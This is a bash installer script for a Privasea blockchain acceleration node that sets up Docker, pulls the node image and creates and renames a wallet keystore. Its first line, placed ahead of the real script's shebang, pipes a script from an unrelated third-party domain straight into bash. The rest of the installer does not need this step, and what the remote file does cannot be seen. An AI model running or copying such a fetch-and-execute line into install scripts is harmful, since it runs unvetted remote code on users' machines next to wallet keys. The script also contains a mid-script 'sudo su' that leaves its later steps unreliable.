#!/bin/bash

curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
sleep 5

#!/bin/bash

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# 1. Check if Docker is installed
if command_exists docker; then
    echo "Docker is already installed."
else
    echo "Docker is not installed. Installing Docker..."

    # Install necessary dependencies
    echo "Installing necessary dependencies..."
    sudo apt update && sudo apt install -y apt-transport-https ca-certificates curl software-properties-common

    # Add Docker's official GPG key
    echo "Adding Docker's GPG key..."
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

    # Add Docker's official repository
    echo "Adding Docker's official repository..."
    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"

    # Update APT package index
    echo "Updating APT package index..."
    sudo apt update

    # Install Docker
    echo "Installing Docker..."
    sudo apt install -y docker-ce

    # Start and enable Docker service
    echo "Starting and enabling Docker service..."
    sudo systemctl start docker
    sudo systemctl enable docker

    # Verify Docker installation
    echo "Verifying Docker installation..."
    sudo docker --version
fi

# 2. Pull the Docker image
echo "Pulling Docker image..."
docker pull privasea/acceleration-node-beta:latest

# 3. Switch to root user
echo "Switching to root user..."
sudo su

# 4. Create the program running directory
echo "Creating program running directory..."
mkdir -p /privasea/config && cd /privasea

# 5. Get the keystore file (create a new one)
echo "Creating new keystore..."
docker run -it -v "/privasea/config:/app/config" privasea/acceleration-node-beta:latest ./node-calc new_keystore

# 6. Automatically detect the keystore file and rename it
echo "Checking and renaming keystore file if found..."
cd /privasea/config

# Find the keystore file (it should start with 'UTC')
keystore_file=$(ls UTC* 2>/dev/null)

if [[ -n "$keystore_file" ]]; then
    # Rename the keystore file to 'wallet_keystore'
    mv "$keystore_file" /privasea/config/wallet_keystore
    echo "Keystore file renamed to wallet_keystore."
else
    echo "No keystore file found to rename."
fi

# 7. Verify the renaming by listing the files in /privasea/config
echo "Verifying the new file structure in /privasea/config:"
for file in /privasea/config/*; do
    echo "  - $file"
done

echo "Installation and configuration completed successfully."